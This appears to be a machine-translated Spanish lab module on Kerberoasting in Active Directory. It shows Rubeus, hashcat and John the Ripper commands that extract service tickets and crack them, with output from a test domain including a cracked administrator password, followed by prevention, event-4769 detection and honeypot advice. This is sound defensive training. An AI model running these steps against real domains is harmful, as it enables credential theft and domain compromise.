# Kerberoasting

# **Descripción**

En Active Directory, un [Nombre principal del servicio (SPN)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) es un identificador de instancia de servicio único. `Kerberos` Utiliza SPNS para la autenticación para asociar una instancia de servicio con una cuenta de inicio de sesión de servicio, que permite que una aplicación del cliente solicite que el servicio autentique una cuenta incluso si el cliente no tiene el nombre de la cuenta. Cuando un kerberos `TGS` Se solicita el ticket de servicio, se cifran con el hash de contraseña NTLM de la cuenta de servicio.

`Kerberoasting` es un ataque posterior a la explotación que intenta explotar este comportamiento obteniendo un boleto y realizando una contraseña fuera de línea para agrietarse a `open` el boleto. Si se abre el boleto, la contraseña del candidato que abrió el ticket es la contraseña de la cuenta de servicio. El éxito de este ataque depende de la fuerza de la contraseña de la cuenta de servicio. Otro factor que tiene algún impacto es el algoritmo de cifrado utilizado cuando se crea el boleto, con las opciones probables: son:

- `AES`
- `RC4`
- `DES` (Se encuentra en entornos que tienen más de 15 años con aplicaciones heredadas de principios de la década de 2000, de lo contrario, esto será deshabilitado)

Hay una diferencia significativa en la velocidad de agrietamiento entre estos tres, ya que AES es más lento para romper que los demás. Mientras que las mejores prácticas de seguridad recomiendan deshabilitar `RC4` (y`DES`, si está habilitado por alguna razón), la mayoría de los entornos no. La advertencia es que no todos los proveedores de aplicaciones han migrado para admitir AES (la mayoría pero no todos). Por defecto, el boleto creado por el `KDC` Será uno con el algoritmo de cifrado más robusto/más alto admitido. Sin embargo, los atacantes pueden obligar a una rebaja a `RC4`.

---

# **Camino de ataque**

Para obtener boletos crujibles, podemos usar [Rubeo](https://github.com/GhostPack/Rubeus). Cuando ejecutamos la herramienta con el `kerberoast` Acción sin especificar a un usuario, extraerá boletos para cada usuario que tenga un SPN registrado (esto puede ser fácilmente en cientos en entornos grandes):

Querberoasting

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads>

```

![](https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes1.png)

Luego necesitamos mover el archivo extraído con los boletos a la VM de Kali Linux para agrietarse (solo nos centraremos en el del administrador de la cuenta, aunque `Rubeus` extrajo dos boletos).

Podemos usar `hashcat` con el modo hash (opción `-m`) `13100` por un `Kerberoastable TGS`. También pasamos un archivo de diccionario con contraseñas (el archivo `passwords.txt`) y guarde la salida de cualquier tickets agrietado con éxito a un archivo llamado `cracked.txt`:

Querberoasting

```
xnoxos@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"hashcat (v6.2.5) starting

<SNIP>

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......:$krb5tgs$23$*Administrator$eagle.local$http/pki1@ea...42bb2cTime.Started.....: Tue Dec 13 10:40:10 2022, (0 secs)
Time.Estimated...: Tue Dec 13 10:40:10 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   143.1 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> bradyHardware.Mon.#1..: Util: 26%Started: Tue Dec 13 10:39:35 2022
Stopped: Tue Dec 13 10:40:11 2022

```

![](https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes3.png)

(Si `hashcat` Da un error, es posible que necesitemos pasar `--force` Como argumento al final del comando).

Una vez `hashcat` Termina el agrietamiento, podemos leer el archivo 'Cracked.txt' para ver la contraseña `Slavi123` en texto plano:

Querberoasting

```
xnoxos@htb[/htb]$ cat cracked.txt$krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab67a0447d7db2945a28d19802d0da64$b6a6a8d3fa2e9e6b47dac1448ade064b5e9d7e04eb4adb5d97a3ef5fd35c8a5c3b9488f09a98b5b8baeaca48483df287495a31a59ccb07209c84e175eef91dc5e4ceb9f7865584ca906965d4bff757bee3658c3e3f38b94f7e1465cd7745d0d84ff3bb67fe370a07cb7f5f350aa26c3f292ee1d7bc31b97db7543182a950c4458ee45f1ff58d1c03b713d11a559f797b85f575aabb72de974cf48c80cbbc78db245c496d3f78c50de655e6572627904753fe223148bc32063c6f032ecdcb901012a98c029de2676905aff97024c89c9d62a73b5f4a614dfd37b90a30a3335326c61b27e788619f84dc0993661be9a9d631d8e4d89d70023b27e5756a23c374f1a59ed15dbe28147296fae252a6d55d663d61759d6ee002b4d3814ada1cafb8997ed594f1cfab6cdb503058b73e192228257d834fd420e9dbc5c12cfffb2077aa5f2abef8cac07ee6cdc7630be71ed174ee167ea0d95df14f48e3e576aa4f90b23d44378d4533cbad945b830bf59f2814ff2dec8832561c3c67bd43afebb231d8f16b1f218dfda803619a47ac833330dde29b34eb73a4aba7da93d7664b92534e44beb80b5ad22a5f80d72f5c476f1796d041ade455eee50651d746db75490bd9a7165b2638c79973fc03c63a67e2659e3057fbe2bce22175116a3892e95a418a02908e0daea3293dc01cd172b524217efe56d842cf8b6f369f30657cd40fe482467d4f2a3a7f3c1caf52cf5f2afc7454fb934a0fb13a0da76dbcefecc32da3a719cd37f944ea13589ce373163d56eb5e8c2dc3fb567b1c5959b7e4e3e054ea9a5561776bed7c2d9eb3107645efce5d22a033891758ac57b187a19006abdbe3f5d53edfc09e5359bc52538afef759c37fbe00cc46e4968ec69072761c2c796bd8e924521cc6c3a50fc1db09e5ce1d443ff3962ca1878904a8252d4f827bcb1e6d6c38bf1fd8ccc21d70751008ece94699aa3caa7e671cb48afc8eb3ecbf181c6e0ed52f740f07e87025c28e4fd832192a66bc390923ea397527264fe382056be78d791f80d0343bbf60ffd09dce061825595f69b939eaa517dc89f4527094bda0ae6febb03d8af3fb3e527e8b5501bbd807ed23ed9bcf85b74be699bd42a284318c42d90dbbd4df332d654529b23a5d81bedec69dba2f3e308d7f8db058377055c15b9eae6275f60a7ec1d52077546caa2b78cf798769a0096d590bb5d5d5173a67a32c2eba174e067a9bf8b4e1f190f8816bf2d6741a8bd6e4e1a6e7ca5ac745061a93cde0ab03ee8cf1de80afa0674a4248d38efdc77aca269e2388c43c83a3919ef80e9a9f0005b1b40026fc29e6262091cbc4f062cf95d5d7e051c019cd0bd5e85b8dcb16b17fd92820e1e1581265a4472c3a5d1f42bb2c:Slavi123
```

![](https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes2.png)

Alternativamente, los hashes de TGS capturados se pueden romper con `John The Ripper`:

Querberoasting

```
┌─[eu-academy-2]─[10.10.15.245]─[htb-ac-594497@htb-mw2xldpqoq]─[~]
└──╼ [★]$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.potCreated directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Node numbers 1-4 of 4 (fork)
Slavi123         (?)
Slavi123         (?)

```

---

# **Prevención**

El éxito de este ataque depende de la fuerza de la contraseña de la cuenta de servicio. Si bien debemos limitar el número de cuentas con SPN y deshabilitar las que ya no se usan/necesarios, debemos asegurarnos de que tengan contraseñas seguras. Para cualquier servicio que lo respalde, la contraseña debe ser más de 100 caracteres aleatorios (127 es el máximo permitido en AD), lo que asegura que descifrar la contraseña sea prácticamente imposible.

También hay lo que se conoce como [Cuentas de servicio administradas grupales](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) (`GMSA`), que es un tipo particular de una cuenta de servicio que Active Directory administra automáticamente; Esta es una solución perfecta porque estas cuentas están vinculadas a un servidor específico, y ningún usuario puede usarlas en ningún otro lugar. Además, Active Directory gira automáticamente la contraseña de estas cuentas a un valor aleatorio de 127 caracteres. Hay una advertencia: no todas las aplicaciones admiten estas cuentas, ya que trabajan principalmente con los servicios de Microsoft (como`IIS`y `SQL`) y algunas otras aplicaciones que han hecho posible la integración. Sin embargo, debemos utilizarlos en todas partes posibles y comenzar a hacer cumplir su uso para nuevos servicios que los admiten para salir de las cuentas corrientes de fase.

En caso de duda, no asigne SPNS a las cuentas que no las necesitan. Asegúrese de que la limpieza regular de los SPN se estableciera a servicios/servidores ya no válidos.

---

# **Detección**

Cuando un `TGS` se solicita, un registro de eventos con ID `4769` se genera. Sin embargo, AD también genera la misma ID de evento cada vez que un usuario intenta conectarse a un servicio, lo que significa que el volumen de este evento es gigantesco, y confiar solo en él es prácticamente imposible de usar como método de detección. Si estamos en un entorno donde todas las aplicaciones admiten los boletos AES y solo AES, entonces sería un excelente indicador para alertar sobre ID de eventos`4769`. Si las opciones de boleto están configuradas para `RC4`, es decir, si `RC4` Los boletos se generan en el entorno AD (que no es la configuración predeterminada), entonces debemos alertar y seguirlo. Esto es lo que se registró cuando solicitamos el boleto para realizar este ataque:

![](https://academy.hackthebox.com/storage/modules/176/A1/Detect1.png)

Aunque el volumen general de este evento es bastante pesado, aún podemos alertar contra la opción predeterminada en muchas herramientas. Cuando ejecutemos 'Rubeus', extraerá un boleto para `each` usuario en el entorno con un SPN registrado; Esto nos permite alertar si alguien genera más de diez boletos en un minuto (por ejemplo, pero podría ser menos de diez). El usuario debe agrupar esta ID del evento solicitando los boletos y la máquina de las que se originaron las solicitudes. Idealmente, debemos tratar de crear dos reglas separadas que alerten a ambas. En nuestro entorno de juegos, hay dos usuarios con SPNS, así que cuando ejecutamos`Rubeus`, AD generó los siguientes eventos:

![](https://academy.hackthebox.com/storage/modules/176/A1/Detect2.png)

---

# **Mielero**

A `honeypot user` es una opción de detección perfecta para configurar en un entorno AD; Este debe ser un usuario sin uso/necesidad real en el entorno, por lo que no se generan boletos de servicio regularmente. En este caso, cualquier intento de generar un boleto de servicio para esta cuenta probablemente sea malicioso y valga la pena inspeccionar. Hay algunas cosas que asegurar al usar esta cuenta:

- La cuenta debe ser un usuario relativamente antiguo, idealmente uno que se haya vuelto falso (los actores de amenaza avanzados no solicitarán boletos para nuevas cuentas porque probablemente tengan contraseñas seguras y la posibilidad de ser un usuario de honeypot).
- La contraseña no debería haberse cambiado recientemente. Un buen objetivo es de más de 2 años, idealmente cinco o más. Pero la contraseña debe ser lo suficientemente fuerte como para que los agentes de amenaza no puedan descifrarla.
- La cuenta debe tener algunos privilegios asignados; De lo contrario, obtener un boleto para él no será de interés (suponiendo que un adversario avanzado obtenga boletos solo para cuentas interesantes/mayor probabilidad de agrietamiento, por ejemplo, debido a una contraseña antigua).
- La cuenta debe tener un SPN registrado, que parece legítimo. `IIS` y `SQL` Las cuentas son buenas opciones porque prevalecen.

Un beneficio adicional para los usuarios de Honeypot es que cualquier actividad con esta cuenta, ya sean intentos de inicio de sesión exitosos o fallidos, es sospechosa y debe ser alertada.

Si volvemos a nuestro entorno de juegos y configuramos al usuario `svc-iam` (Probablemente una antigua cuenta de la cuenta IAM) con las recomendaciones anteriores, entonces cualquier solicitud para obtener un TGS para esa cuenta debe ser alertado sobre:

![](https://academy.hackthebox.com/storage/modules/176/A1/honeypot1.png)

---

# **¡Ten cuidado!**

Aunque damos ejemplos de `honeypot` Detecciones en muchos de los ataques descritos, no significa que un entorno publicitario debe implementar cada uno. Eso haría evidente a un actor de amenaza que los administradores de anuncios han establecido muchas trampas. Debemos considerar todas las detecciones y hacer cumplir las que funcionan mejor para nuestro entorno publicitario.